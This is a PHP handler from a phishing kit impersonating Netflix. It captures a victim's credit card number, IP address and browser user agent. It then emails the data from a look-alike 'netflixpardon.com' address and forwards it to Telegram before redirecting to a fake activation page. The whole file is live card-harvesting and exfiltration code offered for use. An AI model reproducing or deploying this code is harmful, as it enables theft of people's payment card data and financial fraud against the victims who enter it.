<?php



include_once '../inc/app.php';

if(isset($_POST['cardcc'])) 
  
  session_start();
		

		    $_SESSION['cardcc'] = $_POST['cardcc'];
			$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
			$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


	
if( count($_SESSION['errors']) == 0 ) {

			
            $message .= 'CC NUM : ' .$_POST['cardcc']. "\r\n";
            
  
			$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=92=89=E3=80=8D_-_LOGIN_-_?=".$_SESSION['cardcc']." - ".$_SESSION['ip'];
			$headers = "From: =?utf-8?Q?_=F0=9F=83=8F_WEYZUX_=F0=9F=83=8F?= <log@netflixpardon.com>";

			mail($rezmail, $subject, $message, $headers);
	        
            telegram_send(urlencode($message));

			header('Location: ../auth/activation.php');
			}
			





?>